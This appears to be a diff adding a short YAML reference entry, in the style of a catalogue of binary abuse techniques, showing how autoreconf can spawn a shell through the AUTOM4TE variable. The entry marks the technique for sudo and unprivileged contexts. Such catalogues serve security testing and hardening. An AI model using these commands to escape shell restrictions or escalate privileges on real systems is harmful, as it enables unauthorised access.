@@ -1,0 +1,14 @@
+---
+functions:
+  shell:
+  - code: |-
+      echo '/bin/sh 1>&0' >/path/to/temp-file
+      chmod +x /path/to/temp-file
+      echo AC_INIT >configure.ac
+      AUTOM4TE=/path/to/temp-file autoreconf
+    comment: |-
+      The shell is invoked multiple times.
+    contexts:
+      sudo:
+      unprivileged:
+...
